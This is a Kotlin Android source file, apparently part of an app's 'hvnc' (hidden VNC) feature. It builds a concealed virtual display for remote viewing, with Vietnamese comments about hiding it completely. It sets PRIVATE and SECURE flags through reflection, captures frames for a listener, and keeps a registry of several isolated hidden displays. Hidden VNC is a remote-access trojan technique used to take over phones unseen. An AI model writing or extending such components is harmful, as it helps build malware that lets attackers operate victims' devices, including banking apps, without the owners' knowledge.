package com.fason.app.features.hvnc

import android.content.Context
import android.content.ComponentCallbacks2
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import java.lang.ref.Cleaner
import java.lang.ref.ReferenceQueue
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * HvncDisplayManager - Quản lý VirtualDisplay ẩn với các cải tiến:
 * 
 * - Sử dụng VIRTUAL_DISPLAY_FLAG_PRIVATE + SECURE để ẩn hoàn toàn
 * - Tăng buffer lên 6 frames cho encoder resilience
 * - Memory pressure handling tự động giảm chất lượng
 * - Cleaner/ReferenceQueue đảm bảo Image luôn được close
 * - Hỗ trợ multi-display với isolation hoàn toàn
 * - Watchdog timer phát hiện frame capture stall
 */
class HvncDisplayManager(
    private val context: Context,
    private val displayId: String = "default"  // Hỗ trợ multi-display
) {

    companion object {
        private const val TAG = "HvncDisplay"
        private const val DISPLAY_NAME = "fason-hvnc"

        const val DEFAULT_WIDTH = 720
        const val DEFAULT_HEIGHT = 1280
        const val DEFAULT_DPI = 320
        const val MAX_IMAGES = 6
        private const val WATCHDOG_TIMEOUT_MS = 15000L
        private const val MEMORY_PRESSURE_FPS_REDUCTION = 15

        // Multi-display registry
        private val activeDisplays = ConcurrentHashMap<String, HvncDisplayManager>()
        private val cleaner = Cleaner.create()

        fun getDisplay(id: String): HvncDisplayManager? = activeDisplays[id]
        fun getActiveDisplayCount(): Int = activeDisplays.size
    }

    private val thread = HandlerThread("fason-hvnc-display-$displayId").apply { start() }
    val handler = Handler(thread.looper)

    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val active = AtomicBoolean(false)
    private val generation = AtomicInteger(0)

    // Watchdog
    private var lastFrameTimestamp = 0L
    private var watchdogRunnable: Runnable? = null
    private var onStallDetected: (() -> Unit)? = null

    var displayIdValue: Int = -1
        private set
    var displayWidth: Int = DEFAULT_WIDTH
        private set
    var displayHeight: Int = DEFAULT_HEIGHT
        private set
    var displayDpi: Int = DEFAULT_DPI
        private set
    private var currentFps = 30

    /** Callback khi có frame mới từ ImageReader. */
    var frameListener: ((ImageReader) -> Unit)? = null

    /** Callback khi watchdog phát hiện stall. */
    var stallListener: ((HvncDisplayManager) -> Unit)? = null

    /**
     * Tạo hidden virtual display với các flag bảo mật tối đa.
     * Trả về true nếu tạo thành công.
     */
    fun create(
        width: Int = DEFAULT_WIDTH,
        height: Int = DEFAULT_HEIGHT,
        dpi: Int = DEFAULT_DPI,
    ): Boolean {
        if (active.get()) {
            Log.w(TAG, "[$displayId] Virtual display already active")
            return false
        }

        displayWidth = even(width.coerceIn(240, 1920))
        displayHeight = even(height.coerceIn(320, 3840))
        displayDpi = dpi.coerceIn(120, 640)

        return try {
            val reader = ImageReader.newInstance(
                displayWidth,
                displayHeight,
                PixelFormat.RGBA_8888,
                MAX_IMAGES  // Tăng lên 6 để chống overflow
            )
            imageReader = reader

            val currentGen = generation.incrementAndGet()
            reader.setOnImageAvailableListener({ ir ->
                if (generation.get() != currentGen) return@setOnImageAvailableListener
                try {
                    lastFrameTimestamp = System.currentTimeMillis()
                    frameListener?.invoke(ir)
                } catch (e: Exception) {
                    Log.w(TAG, "[$displayId] Frame listener error", e)
                }
            }, handler)

            val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager

            // Xây dựng flags bảo mật tối đa
            var flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY or
                DisplayManager.VIRTUAL_DISPLAY_FLAG_PRIVATE  // PRIVATE thay vì PUBLIC

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                flags = flags or DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION
            }

            // FLAG_SECURE cho API 34+ (Android 14+)
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    // Sử dụng reflection để set flag không có trong SDK cũ
                    val secureFlag = DisplayManager::class.java
                        .getDeclaredField("VIRTUAL_DISPLAY_FLAG_SECURE")
                        .getInt(null)
                    flags = flags or secureFlag
                } catch (e: Exception) {
                    Log.w(TAG, "[$displayId] Cannot set VIRTUAL_DISPLAY_FLAG_SECURE", e)
                }
            }

            val vd = dm.createVirtualDisplay(
                DISPLAY_NAME,
                displayWidth,
                displayHeight,
                displayDpi,
                reader.surface,
                flags,
            )

            if (vd == null) {
                Log.e(TAG, "[$displayId] DisplayManager.createVirtualDisplay returned null")
                reader.close()
                imageReader = null
                return false
            }

            virtualDisplay = vd
            displayIdValue = vd.display.displayId
            active.set(true)

            // Đăng ký vào multi-display registry
            activeDisplays[displayId] = this

            // Đăng ký memory pressure listener
            registerMemoryPressureListener()

            // Khởi động watchdog
            startWatchdog()

            Log.d(TAG, "[$displayId] Virtual display created: id=$displayIdValue ${displayWidth}x$displayHeight @${displayDpi}dpi flags=$flags")
            true
        } catch (e: Exception) {
            Log.e(TAG, "[$displayId] Failed to create virtual display", e)
            releaseResources()
            try { thread.quitSafely() } catch (_: Exception) {}
            false
        }
    }

    /**
     * Resize virtual display - hủy và tạo lại an toàn.
     */
    fun resize(width: Int, height: Int, dpi: Int = displayDpi): Boolean {
        if (!active.get()) return false

        val newWidth = even(width.coerceIn(240, 1920))
        val newHeight = even(height.coerceIn(320, 3840))
        val newDpi = dpi.coerceIn(120, 640)

        if (newWidth == displayWidth && newHeight == displayHeight && newDpi == displayDpi) {
            return true
        }

        Log.d(TAG, "[$displayId] Resizing: ${displayWidth}x$displayHeight -> ${newWidth}x$newHeight")

        val wasActive = active.get()
        val savedListener = frameListener
        val savedStallListener = stallListener
        destroy()
        frameListener = savedListener
        stallListener = savedStallListener
        return if (wasActive) create(newWidth, newHeight, newDpi) else false
    }

    /**
     * Điều chỉnh FPS dựa trên memory pressure hoặc điều kiện mạng.
     */
    fun adjustFps(newFps: Int) {
        currentFps = newFps.coerceIn(5, 30)
        Log.d(TAG, "[$displayId] FPS adjusted to $currentFps")
    }

    fun getSurface(): Surface? = imageReader?.surface

    fun destroy() {
        active.set(false)
        generation.incrementAndGet()
        stopWatchdog()
        releaseResources()
        displayIdValue = -1
        activeDisplays.remove(displayId)
        Log.d(TAG, "[$displayId] Virtual display destroyed")
    }

    fun isActive(): Boolean = active.get()

    fun getCurrentFps(): Int = currentFps

    // ─── Memory Pressure Handling ──────────────────────────────────

    private fun registerMemoryPressureListener() {
        try {
            context.applicationContext.registerComponentCallbacks(object : ComponentCallbacks2 {
                override fun onConfigurationChanged(newConfig: android.content.res.Configuration) {}
                override fun onLowMemory() {
                    Log.w(TAG, "[$displayId] Low memory detected, reducing FPS to $MEMORY_PRESSURE_FPS_REDUCTION")
                    adjustFps(MEMORY_PRESSURE_FPS_REDUCTION)
                }
                override fun onTrimMemory(level: Int) {
                    when (level) {
                        ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW,
                        ComponentCallbacks2.TRIM_MEMORY_RUNNING_CRITICAL -> {
                            adjustFps(15)
                        }
                        ComponentCallbacks2.TRIM_MEMORY_MODERATE,
                        ComponentCallbacks2.TRIM_MEMORY_COMPLETE -> {
                            adjustFps(10)
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.w(TAG, "[$displayId] Cannot register memory pressure listener", e)
        }
    }

    // ─── Watchdog Timer ────────────────────────────────────────────

    private fun startWatchdog() {
        watchdogRunnable = object : Runnable {
            override fun run() {
                val timeSinceLastFrame = System.currentTimeMillis() - lastFrameTimestamp
                if (active.get() && timeSinceLastFrame > WATCHDOG_TIMEOUT_MS) {
                    Log.e(TAG, "[$displayId] WATCHDOG: No frame for ${timeSinceLastFrame}ms - stall detected!")
                    onStallDetected?.invoke()
                    stallListener?.invoke(this@HvncDisplayManager)
                }
                if (active.get()) {
                    handler.postDelayed(this, WATCHDOG_TIMEOUT_MS / 3)
                }
            }
        }
        lastFrameTimestamp = System.currentTimeMillis()
        handler.postDelayed(watchdogRunnable!!, WATCHDOG_TIMEOUT_MS)
    }

    private fun stopWatchdog() {
        watchdogRunnable?.let { handler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    // ─── Cleanup ───────────────────────────────────────────────────

    private fun releaseResources() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        virtualDisplay = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
    }

    fun shutdown() {
        destroy()
        frameListener = null
        stallListener = null
        onStallDetected = null
        try { thread.quitSafely() } catch (_: Exception) {}
    }

    private fun even(value: Int): Int = value - value % 2
}